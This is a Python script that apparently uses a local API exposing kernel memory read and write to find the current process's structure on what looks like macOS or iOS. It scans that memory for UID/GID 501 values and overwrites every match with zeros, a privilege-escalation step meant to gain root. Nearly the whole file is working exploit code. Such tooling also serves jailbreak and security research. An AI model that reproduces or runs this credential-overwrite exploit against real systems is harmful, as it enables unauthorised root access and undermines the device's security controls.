#!/usr/bin/env python3
import os
import sys
import struct
import requests

API_BASE = os.environ.get('API_BASE', 'http://127.0.0.1:8000')
TIMEOUT = 5

def api_get(path, params=None):
    url = API_BASE + path
    r = requests.get(url, params=params, timeout=TIMEOUT)
    r.raise_for_status()
    return r.json()

def post_kread(addr, size):
    url = API_BASE + '/api/v1/kread'
    r = requests.post(url, json={'addr': hex(addr), 'size': size}, timeout=TIMEOUT)
    r.raise_for_status()
    data = r.json()
    if 'value' in data and isinstance(data['value'], str):
        hexs = data['value'][2:] if data['value'].startswith('0x') else data['value']
        if len(hexs) % 2:
            hexs = '0' + hexs
        raw = bytes.fromhex(hexs)
    elif 'data' in data:
        d = data['data']
        if isinstance(d, str):
            hexs = d[2:] if d.startswith('0x') else d
            raw = bytes.fromhex(hexs)
        elif isinstance(d, list):
            raw = bytes(d)
        else:
            raise RuntimeError('kread: unsupported data')
    else:
        raise RuntimeError('kread: missing value/data')
    if len(raw) < size:
        raw = raw.ljust(size, b'\x00')
    return raw[:size]

def post_kwrite(addr, data_bytes):
    url = API_BASE + '/api/v1/kwrite'
    try:
        r = requests.post(url, json={'addr': hex(addr), 'data': data_bytes.hex()}, timeout=TIMEOUT)
        r.raise_for_status()
        return r.json()
    except requests.exceptions.ConnectionError:
        print(' CRASHED')
        sys.exit(1)
    except requests.RequestException as e:
        print('[ERROR] kwrite request failed:', e)
        return None

def hexdump(data, width=16):
    for i in range(0, len(data), width):
        chunk = data[i:i+width]
        hexs = ' '.join(f'{b:02x}' for b in chunk)
        print(f'Offset 0x{i:02X}: {hexs}')

def main():
    print('scan_proc_structure: starting')
    # get ourproc
    try:
        ds = api_get('/api/v1/ds')
    except Exception as e:
        print('[ERROR] /api/v1/ds failed:', e)
        sys.exit(1)
    ourproc = ds.get('ourproc')
    if ourproc is None:
        print('[ERROR] ourproc not found in /api/v1/ds')
        sys.exit(1)
    ourproc = int(ourproc, 0) if isinstance(ourproc, str) else int(ourproc)
    print(f'ourproc = 0x{ourproc:016x}')

    # read 256 bytes
    size = 256
    print(f'Reading {size} bytes from 0x{ourproc:016x}...')
    try:
        data = post_kread(ourproc, size)
    except Exception as e:
        print('[ERROR] kread failed:', e)
        sys.exit(1)

    hexdump(data)

    # search patterns
    patterns = []
    # 4-byte little-endian UID 501 -> 0x000001f5 -> bytes f5 01 00 00
    patterns.append((b'UID32', b'\xf5\x01\x00\x00'))
    # 8-byte repeated UID+GID 0x000001f5000001f5 -> little-endian bytes f5 01 00 00 f5 01 00 00
    patterns.append((b'UID64', b'\xf5\x01\x00\x00\xf5\x01\x00\x00'))

    found = []
    for name, pat in patterns:
        off = 0
        while True:
            idx = data.find(pat, off)
            if idx == -1:
                break
            print(f'Found {name} at offset 0x{idx:02X}')
            found.append((name, idx, pat))
            off = idx + 1

    if not found:
        print('No UID/GID patterns found in first 256 bytes')
        sys.exit(0)

    # attempt write zero at found offsets (for each match)
    for name, idx, pat in found:
        addr = ourproc + idx
        length = len(pat)
        print(f'Attempting to write {length} zero bytes to 0x{addr:016x} for {name}...')
        res = post_kwrite(addr, b'\x00' * length)
        print('kwrite response:', res)

if __name__ == '__main__':
    main()
